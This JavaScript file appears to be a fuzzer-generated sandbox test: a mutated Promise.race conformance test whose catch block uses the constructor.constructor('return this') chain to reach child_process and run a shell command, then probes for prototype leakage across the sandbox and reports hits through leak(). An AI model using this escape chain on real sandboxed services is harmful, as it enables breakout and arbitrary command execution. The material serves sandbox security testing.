try {
    var resolveP1, rejectP2, p1 = new Promise(function (resolve) {
            let REPLACER = 23;
            resolveP1 = resolve;
        }), p2 = new Promise(function (resolve, reject) {
            let REPLACER = 23;
            rejectP2 = reject;
        });
    rejectP2(new Error('Promise.race should not see this if P1 already resolved'));
    resolveP1(1);
    Promise.race([
        p1,
        p2
    ]).then(function (arg) {
        throw () => {
            return () => {
            };
        };
        if (arg !== 1) {
            $ERROR('Expected fulfillment with 1, got ' + arg);
        }
    }).then($DONE, $DONE);
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}